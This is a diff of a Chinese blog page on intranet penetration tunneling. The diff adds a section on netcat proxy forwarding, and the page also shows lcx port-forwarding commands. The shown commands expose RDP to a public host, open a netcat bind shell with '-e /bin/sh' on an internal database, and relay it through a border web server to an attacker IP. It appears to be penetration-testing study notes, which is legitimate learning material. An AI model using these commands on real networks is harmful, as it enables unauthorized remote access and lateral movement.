@@ -419,7 +419,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-08-09 02:11:11'>2020-02-03 10:36</time>
+            Created At : <time class="date" title='Updated At: 2020-08-10 00:15:46'>2020-02-03 10:36</time>
         
     </div>
     <div class="article-meta">
@@ -441,7 +441,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#内网渗透-建立隐藏通信隧道"><span class="toc-text">内网渗透-建立隐藏通信隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#网络层隧道技术"><span class="toc-text">网络层隧道技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#传输层隧道技术"><span class="toc-text">传输层隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、lcx-端口转发"><span class="toc-text">1、lcx 端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-内网端口转发"><span class="toc-text">1.1 内网端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-本地端口映射"><span class="toc-text">1.2 本地端口映射</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#应用层隧道技术"><span class="toc-text">应用层隧道技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SOCKS-代理"><span class="toc-text">SOCKS 代理</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#内网渗透-建立隐藏通信隧道"><span class="toc-text">内网渗透-建立隐藏通信隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#网络层隧道技术"><span class="toc-text">网络层隧道技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#传输层隧道技术"><span class="toc-text">传输层隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、lcx-端口转发"><span class="toc-text">1、lcx 端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-内网端口转发"><span class="toc-text">1.1 内网端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-本地端口映射"><span class="toc-text">1.2 本地端口映射</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、NC-代理转发"><span class="toc-text">2、NC 代理转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#应用层隧道技术"><span class="toc-text">应用层隧道技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SOCKS-代理"><span class="toc-text">SOCKS 代理</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -469,7 +469,18 @@ lcx.exe -slave 公网主机IP  4444 127.0.0.1 3389
 lcx.exe -listen 4444 5555
 此时，我们使用 mstsc 连接 &lt;公网IP地址&gt;：5555，即可访问目标服务器的3389端口。</code></pre><h4 id="1-2-本地端口映射"><a href="#1-2-本地端口映射" class="headerlink" title="1.2 本地端口映射"></a>1.2 本地端口映射</h4><pre><code>如果目标主机的部分端口（如3389）被防火墙拦截时，我们可以通过目标主机相应端口的数据传到防火墙允许的其他端口（如53）。
 在目标主机上执行如下命令，就可以直接从远程桌面连接到目标主机的53端口了。
-lcx.exe -tran &lt;目标主机IP地址&gt; 3389</code></pre><h2 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h2><h2 id="SOCKS-代理"><a href="#SOCKS-代理" class="headerlink" title="SOCKS 代理"></a>SOCKS 代理</h2>
+lcx.exe -tran &lt;目标主机IP地址&gt; 3389</code></pre><h3 id="2、NC-代理转发"><a href="#2、NC-代理转发" class="headerlink" title="2、NC 代理转发"></a>2、NC 代理转发</h3><pre><code>通过边界机作代理,使kali与数据库通信,访问内网数据库：
+
+攻击机：192.136.100.111 (公网IP)
+WEB边界机：192.168.1.100 10.10.10.100
+内网数据库：10.10.10.200
+
+攻击机执行:
+nc -lvp 3333
+数据库执行:
+nc -lvp 3333 -e /bin/sh
+web服务器执行：
+nc -v 192.136.100.111 3333 -c &quot;nc -v 10.10.10.200 3333&quot;</code></pre><h2 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h2><h2 id="SOCKS-代理"><a href="#SOCKS-代理" class="headerlink" title="SOCKS 代理"></a>SOCKS 代理</h2>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源。 </span>
     </div>
